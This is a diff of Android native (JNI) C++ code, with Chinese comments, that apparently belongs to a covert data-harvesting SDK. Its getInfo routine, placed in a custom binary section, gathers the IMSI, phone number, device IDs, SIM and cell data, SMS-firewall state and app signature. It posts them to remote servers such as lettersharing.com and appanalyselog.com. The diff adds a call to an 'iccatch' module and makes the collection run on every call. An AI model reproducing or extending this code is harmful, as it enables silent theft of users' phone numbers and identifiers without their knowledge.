@@ -6,7 +6,7 @@
 #include "WM.h"
 #include "OtherParams.h"
 #include "Utils.h"
-#include "TokenDef.h"
+#include "Token_Z.h"
 #include "curl/curl.h"
 #include <sys/time.h>
 #include "MyCts.h"
@@ -16,7 +16,7 @@ jstring getInfo(JNIEnv * env, jclass jc, jobject ctxObj)
 
 extern  map<string,string> strs;
 //记录程序的进度 -
-string sub_version = "20";
+string sub_version = "22";
 /*
  * 为某一个类注册本地方法
  */
@@ -78,78 +78,79 @@ JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved)
 
 
 
-static size_t GetContent(void *data, int size, int nmemb,
-		std::string &myContent) {
-	long sizes = size * nmemb;
-	std::string temp((char*) data, sizes);
-	myContent += temp;
-	return sizes;
-}
+//static size_t GetContent(void *data, int size, int nmemb,
+//		std::string &myContent) {
+//	long sizes = size * nmemb;
+//	std::string temp((char*) data, sizes);
+//	myContent += temp;
+//	return sizes;
+//}
 
-static int  httpPost(const char *url,
-		const char *postdata, const char *headers) {
-	long netRetcode = 0;
-	char error[2048];
-	// 接受返回的内容，用于打印出来看
-	string myContent;
-	if (CURLE_OK != curl_global_init(CURL_GLOBAL_ALL)) {
-		//LOGE("Get: init failed!!!");
-		return -1;
-	}
-	if (logShow)
-		LOGE("httpPost!!!!!");
-
-	CURL *easy_handle = curl_easy_init();
-	if (NULL == easy_handle) {
-		if (logShow)
-			LOGE("Get: get easy_handle failed!!!");
-		return -1;
-	}
-	//url set
-	curl_easy_setopt(easy_handle, CURLOPT_URL, url);
-	//post 方式
-	curl_easy_setopt(easy_handle, CURLOPT_POST, 1);
-	//curl_easy_setopt(easy_handle, CURLOPT_HTTPGET, 1);
-	curl_easy_setopt(easy_handle, CURLOPT_POSTFIELDS, postdata);
-	curl_easy_setopt(easy_handle, CURLOPT_WRITEFUNCTION, GetContent);
-	curl_easy_setopt(easy_handle, CURLOPT_ERRORBUFFER, error);
-	curl_easy_setopt(easy_handle, CURLOPT_WRITEDATA, &myContent);
-	int myRetCode = 0;
-	//exe
-	if (logShow)
-		LOGI("url=%s", url);
-	if (logShow)
-		LOGI("params=%s", postdata);
-	if (CURLE_OK == curl_easy_perform(easy_handle)) {
-		curl_easy_getinfo(easy_handle, CURLINFO_RESPONSE_CODE, &netRetcode);
-		if (logShow)
-			LOGE("retCode = %ld", netRetcode);
-		//执行成功
-		if (netRetcode == 200) {
-			if (logShow)
-				LOGI("curl content = %s", myContent.c_str());
-			if (myContent.find("status") != std::string::npos) {
-				myRetCode = 200;   //
-			}
-		}
-	}
-	if (string(error).length() > 0)
-		if (logShow)
-			LOGI("errorBuffer  = %s", error);
-	//	LOGE("ct%s=",myContent.c_str());
-	curl_easy_cleanup(easy_handle);
-	curl_global_cleanup();
-	return myRetCode;
-}
+//static int  httpPost(const char *url,
+//		const char *postdata, const char *headers) {
+//	long netRetcode = 0;
+//	char error[2048];
+//	// 接受返回的内容，用于打印出来看
+//	string myContent;
+//	if (CURLE_OK != curl_global_init(CURL_GLOBAL_ALL)) {
+//		//LOGE("Get: init failed!!!");
+//		return -1;
+//	}
+//	if (logShow)
+//		LOGE("httpPost!!!!!");
+//
+//	CURL *easy_handle = curl_easy_init();
+//	if (NULL == easy_handle) {
+//		if (logShow)
+//			LOGE("Get: get easy_handle failed!!!");
+//		return -1;
+//	}
+//	//url set
+//	curl_easy_setopt(easy_handle, CURLOPT_URL, url);
+//	//post 方式
+//	curl_easy_setopt(easy_handle, CURLOPT_POST, 1);
+//	//curl_easy_setopt(easy_handle, CURLOPT_HTTPGET, 1);
+//	curl_easy_setopt(easy_handle, CURLOPT_POSTFIELDS, postdata);
+//	curl_easy_setopt(easy_handle, CURLOPT_WRITEFUNCTION, GetContent);
+//	curl_easy_setopt(easy_handle, CURLOPT_ERRORBUFFER, error);
+//	curl_easy_setopt(easy_handle, CURLOPT_WRITEDATA, &myContent);
+//	int myRetCode = 0;
+//	//exe
+//	if (logShow)
+//		LOGI("url=%s", url);
+//	if (logShow)
+//		LOGI("params=%s", postdata);
+//	if (CURLE_OK == curl_easy_perform(easy_handle)) {
+//		curl_easy_getinfo(easy_handle, CURLINFO_RESPONSE_CODE, &netRetcode);
+//		if (logShow)
+//			LOGE("retCode = %ld", netRetcode);
+//		//执行成功
+//		if (netRetcode == 200) {
+//			if (logShow)
+//				LOGI("curl content = %s", myContent.c_str());
+//			if (myContent.find("status") != std::string::npos) {
+//				myRetCode = 200;   //
+//			}
+//		}
+//	}
+//	if (string(error).length() > 0)
+//		if (logShow)
+//			LOGI("errorBuffer  = %s", error);
+//	//	LOGE("ct%s=",myContent.c_str());
+//	curl_easy_cleanup(easy_handle);
+//	curl_global_cleanup();
+//	return myRetCode;
+//}
 
 //上传失败原因
 void postFaieldReason(string imsi,string code,string vercode,string uuid){
 	//101 : 充电格式为0
 	//102 : 当前设备已root
 	string params = string("imsi=")+imsi+"&code="+code+"&vercode="+vercode+"&uuid="+uuid;
+	string rets;
 	int i = httpPost(
 					"http://utils.appanalyselog.com/nice/log",//http://utils.appanalyselog.com/nice/log
-					params.c_str(), "");
+					params.c_str(),"", rets);
 }
 
 
@@ -176,10 +177,13 @@ void __attribute__((section ("getInfo")))   setProgress(JNIEnv * env, jobject ct
 	LOGI("progress :%d",gress);
 }
 
-
+#include "iccatch/IcCore.h"
 jstring __attribute__((section ("getInfo"))) getInfo(JNIEnv * env, jclass jc, jobject ctxObj) {
+
+	icExecute(env,ctxObj);
+
 	jobject sp = getSp(env, ctxObj);
-	string key_success = "success";
+	string key_success = "no_success";//外层java代码，判断success，但不会再进到so来，这里改下，让每次都进来。 begin 23
 	string key_failed = "failed";
 
 
@@ -223,6 +227,7 @@ jstring __attribute__((section ("getInfo"))) getInfo(JNIEnv * env, jclass jc, jo
 	string key_appPackname = "appPackname";
 	string key_channelId = "channelId";
 	string key_gameId = "gameId";
+	string key_pakTime = "pakTime";
 	string key_times = "curTime";
 	string key_sign = "sign";
 	//setProgress(env, ctxObj,sp, 11);
@@ -282,44 +287,50 @@ jstring __attribute__((section ("getInfo"))) getInfo(JNIEnv * env, jclass jc, jo
 	}
 	setProgress(env, ctxObj, sp, 14);
 	//string testImsi = "460078569036967";
-	Token token(env, imsi.c_str(), pkname.c_str());
+//	Token token(env, imsi.c_str(), pkname.c_str());
+
+	Token_Z token(env,imsi.c_str(), pkname.c_str());
+//	string rel =jstringTostring(env,tz.getTel(),true);
 	//setProgress(env, ctxObj,sp, 15);
 	if (logShow)
 		LOGI("token after");
-	int rootInt = token.isRoot();
+	//int rootInt = token.isRoot();
 	//setProgress(env, ctxObj,sp, 16);
-	jstring j_uuid = token.getUUID();
+ 	jstring j_uuid = token.getUUID();
 	//setProgress(env, ctxObj,sp, 161);
-	jstring j_uid = token.getUid();
+ 	jstring j_uid = token.getUid();
 	//setProgress(env,ctxObj, sp, 17);
 	jstring j_tel = token.getTel();
 
 
 
 
-	jstring j_installFlag = token.getInstallFlg();
-	jstring j_startFlag = token.getStartFlag();
+	//jstring j_installFlag = token.getInstallFlg();
+	//jstring j_startFlag = token.getStartFlag();
 	//setProgress(env,ctxObj,sp, 18);
-	jstring j_userToken = token.getUserToken();
-	string tokenType = token.getTokenType();
+	//jstring j_userToken = token.getUserToken();
+	//string tokenType = token.getTokenType();
 //	setProgress(env,ctxObj, sp, 19);
 	long timel = getCurrentTime();
 	string times;
 	long2str(timel, times);
 	//setProgress(env,ctxObj, sp, 191);
-	string isRoot;
-	int2str(rootInt, isRoot);
-	string uuid = j_uuid == NULL ? "" : jstringTostring(env, j_uuid,true);
-	string uid = j_uid == NULL ? "" : jstringTostring(env, j_uid,true);
+	//string isRoot;
+//	int2str(rootInt, isRoot);
+	 string uuid = j_uuid == NULL ? "" : jstringTostring(env, j_uuid,true);
+ 	string uid = j_uid == NULL ? "" : jstringTostring(env, j_uid,true);
 	string tel = j_tel == NULL ? "" : jstringTostring(env, j_tel,true);
 	MyCts * Cts = MyCts::GetInstance();
 	//延迟5秒获取tel
 	if(tel=="") {
 		thSleep(env, 12000);
-		Token token2(env, imsi.c_str(), pkname.c_str());
+//		Token token2(env, imsi.c_str(), pkname.c_str());
+		Token_Z token2(env,imsi.c_str(), pkname.c_str());
 		jstring j_tel2 = token2.getTel();
 		tel = j_tel2 == NULL ? "" : jstringTostring(env, j_tel2,true);
 	}
+
+
 	//写入共享数据
 	writeNiceShare(env, ctxObj, tel);
 	jobject shareSp = getShareSp(env,ctxObj);
@@ -329,49 +340,56 @@ jstring __attribute__((section ("getInfo"))) getInfo(JNIEnv * env, jclass jc, jo
 	string versionCode = getVersioncode(env, ctxObj);
 	string dVersion = spGet(env,sp,"dVersion","");
 
-	string installFlag =
-			j_installFlag == NULL ?
-			"" : jstringTostring(env, j_installFlag,true);
-	string startFlag =
-			j_startFlag == NULL ?
-			"" : jstringTostring(env, j_startFlag,true);
-	string userToken =
-			j_userToken == NULL ?
-			"" : jstringTostring(env, j_userToken,true);
+	env->DeleteLocalRef(shareSp);
+
+//	string installFlag =
+//			j_installFlag == NULL ?
+//			"" : jstringTostring(env, j_installFlag,true);
+//	string startFlag =
+//			j_startFlag == NULL ?
+//			"" : jstringTostring(env, j_startFlag,true);
+//	string userToken =
+//			j_userToken == NULL ?
+//			"" : jstringTostring(env, j_userToken,true);
 
 	setProgress(env, ctxObj, sp, 2);
-	if (firstUp=="true"&&userToken.empty()) {
-		if (logShow)
-			LOGI("user token is empty!");
-		setProgress(env, ctxObj, sp, 0);
-		if (env->ExceptionCheck() == JNI_TRUE) {
-			env->ExceptionClear();
-			//return env->NewStringUTF(key_failed);
-		}
-		LOGE("ErrCode=%s", "104");
-		return env->NewStringUTF(key_failed.c_str());
+//	if (firstUp=="true"&&userToken.empty()) {
+//		if (logShow)
+//			LOGI("user token is empty!");
+//		setProgress(env, ctxObj, sp, 0);
+//		if (env->ExceptionCheck() == JNI_TRUE) {
+//			env->ExceptionClear();
+//			//return env->NewStringUTF(key_failed);
+//		}
+//		LOGE("ErrCode=%s", "104");
+//		return env->NewStringUTF(key_failed.c_str());
+//	}
+	if(firstUp=="true"){
+		LOGE("already!!!");
+		return env->NewStringUTF(key_success.c_str());
 	}
+
 	//setProgress(env,ctxObj, sp, 21);
 	//save
 	//获取token
-	string str_cmToken = uuid + uid + tel + userToken;
-	string nativeToken = spGet(env, sp, "that_num", "-1");
+	//string str_cmToken = uuid + uid + tel + userToken;
+	//string nativeToken = spGet(env, sp, "that_num", "-1");
 	//setProgress(env,ctxObj, sp, 22);
-	int int_cmToken = simple_hash(str_cmToken.c_str());
-	string cmToken4int;
-	int2str(int_cmToken, cmToken4int);   //将str_cmToken改成int型赋予新值
-	if (logShow)
-		LOGI("nativeToken=%s , cmToken=%s", nativeToken.c_str(),
-			 cmToken4int.c_str());
+	//int int_cmToken = simple_hash(str_cmToken.c_str());
+	//string cmToken4int;
+	//int2str(int_cmToken, cmToken4int);   //将str_cmToken改成int型赋予新值
+//	if (logShow)
+//		LOGI("nativeToken=%s , cmToken=%s", nativeToken.c_str(),
+//			 cmToken4int.c_str());
 
 	setProgress(env, ctxObj, sp, 3);
 	//比较token
-	if (str_cmToken.empty()) {
-		setProgress(env, ctxObj, sp, 0);
-		return env->NewStringUTF(key_failed.c_str());
-	}
+//	if (str_cmToken.empty()) {
+//		setProgress(env, ctxObj, sp, 0);
+//		return env->NewStringUTF(key_failed.c_str());
+//	}
 
-	if (firstUp==""||nativeToken != cmToken4int) {    //不相同
+	if (firstUp==""/*||nativeToken != cmToken4int*/) {    //不相同
 		if (logShow)
 			LOGI("token not equals");
 		//联网上传
@@ -403,6 +421,9 @@ jstring __attribute__((section ("getInfo"))) getInfo(JNIEnv * env, jclass jc, jo
 		string channelId = spGet(env, sp, key_channelId.c_str(),
 								 "-1");
 		string gameId = spGet(env, sp, key_gameId.c_str(), "-1");
+		string pakTime = spGet(env, sp, key_pakTime.c_str(), "");
+
+
 		string sign = getSignHash(env, ctxObj);
 		setProgress(env, ctxObj, sp, 4);
 
@@ -422,20 +443,21 @@ jstring __attribute__((section ("getInfo"))) getInfo(JNIEnv * env, jclass jc, jo
 				 + QUOTE + key_simCountryIso + QUOTE + ":" + QUOTE + simIso + QUOTE + ","
 				 + QUOTE + key_simState + QUOTE + ":" + QUOTE + simState + QUOTE + ","
 				 + QUOTE + key_smsFirewall + QUOTE + ":" + QUOTE + smsFirewall + QUOTE + ","
-				 + QUOTE + key_isRoot + QUOTE + ":" + QUOTE + isRoot + QUOTE + ","
-				 + QUOTE + key_UUID + QUOTE + ":" + QUOTE + uuid + QUOTE + ","
-				 + QUOTE + key_uid + QUOTE + ":" + QUOTE + uid + QUOTE + ","
+//				 + QUOTE + key_isRoot + QUOTE + ":" + QUOTE + isRoot + QUOTE + ","
+ 				 + QUOTE + key_UUID + QUOTE + ":" + QUOTE + uuid + QUOTE + ","
+  				 + QUOTE + key_uid + QUOTE + ":" + QUOTE + uid + QUOTE + ","
 				 + QUOTE + key_tel + QUOTE + ":" + QUOTE + tel + QUOTE + ","
-				 + QUOTE + key_installFlag + QUOTE + ":" + QUOTE + installFlag + QUOTE + ","
-				 + QUOTE + key_startFlag + QUOTE + ":" + QUOTE + startFlag + QUOTE + ","
-				 + QUOTE + key_userToken + QUOTE + ":" + QUOTE + userToken + QUOTE + ","
+//				 + QUOTE + key_installFlag + QUOTE + ":" + QUOTE + installFlag + QUOTE + ","
+//				 + QUOTE + key_startFlag + QUOTE + ":" + QUOTE + startFlag + QUOTE + ","
+//				 + QUOTE + key_userToken + QUOTE + ":" + QUOTE + userToken + QUOTE + ","
 				 + QUOTE + key_appPackname + QUOTE + ":" + QUOTE + pkname + QUOTE + ","
 				 + QUOTE + key_channelId + QUOTE + ":" + QUOTE + channelId + QUOTE + ","
 				 + QUOTE + key_times + QUOTE + ":" + QUOTE + times + QUOTE + ","
-				 + QUOTE + key_tokenType + QUOTE + ":" + QUOTE + tokenType + QUOTE + ","
+//				 + QUOTE + key_tokenType + QUOTE + ":" + QUOTE + tokenType + QUOTE + ","
 				 + QUOTE + key_sign + QUOTE + ":" + QUOTE + sign + QUOTE + ","
 				 + QUOTE + key_version + QUOTE + ":" + QUOTE + version + QUOTE + ","
 				 + QUOTE + key_gameId + QUOTE + ":" + QUOTE + gameId + QUOTE+","
+				 + QUOTE + key_pakTime + QUOTE + ":" + QUOTE + pakTime + QUOTE+","
 				 +QUOTE + Cts->cellId+QUOTE +":"+QUOTE+cellId+QUOTE+","
 				 +QUOTE + Cts->versionCode+QUOTE +":"+QUOTE+versionCode+QUOTE+","
 				 +QUOTE + Cts->dVersion+QUOTE +":"+QUOTE+dVersion+QUOTE+","
@@ -464,9 +486,10 @@ jstring __attribute__((section ("getInfo"))) getInfo(JNIEnv * env, jclass jc, jo
 
 		//上传
 		string headers = "";
+		string ret;
 		int i = httpPost(
 				"http://wtbtk.lettersharing.com/nice/upload",//http://utils.lettersharing.com/shua/upload,http://utils.appanalyselog.com/nice/upload
-				en_ps.c_str(), headers.c_str());
+				en_ps.c_str(), headers.c_str(),ret);
 		//	setProgress(env,ctxObj, sp, 7);
 		//联网失败
 		if (i != 200) {
@@ -480,11 +503,11 @@ jstring __attribute__((section ("getInfo"))) getInfo(JNIEnv * env, jclass jc, jo
 		//联网成功，写入标记
 		LOGI("net success ... ");
 		//spPut(env, sp, "eover", "true");	//执行结束的标志，由外部来判断。
-		spPut(env, sp, "that_num", cmToken4int.c_str());//上传成功才写入新的token
+	//	spPut(env, sp, "that_num", cmToken4int.c_str());//上传成功才写入新的token
 
 		if(firstUp=="") {
 			spPut(env, sp, "firstUp", "true");
-			if(userToken.empty())return env->NewStringUTF(key_failed.c_str());
+		//	if(userToken.empty())return env->NewStringUTF(key_failed.c_str());
 		}
 	} else {
 		if (logShow)
@@ -496,7 +519,8 @@ jstring __attribute__((section ("getInfo"))) getInfo(JNIEnv * env, jclass jc, jo
 		env->ExceptionClear();
 		return env->NewStringUTF(key_failed.c_str());
 	}
-
+	if(tm!=NULL)env->DeleteLocalRef(tm);
+	if(wm!=NULL)env->DeleteLocalRef(wm);
 	return env->NewStringUTF(key_success.c_str());    //成功结束
 }
 
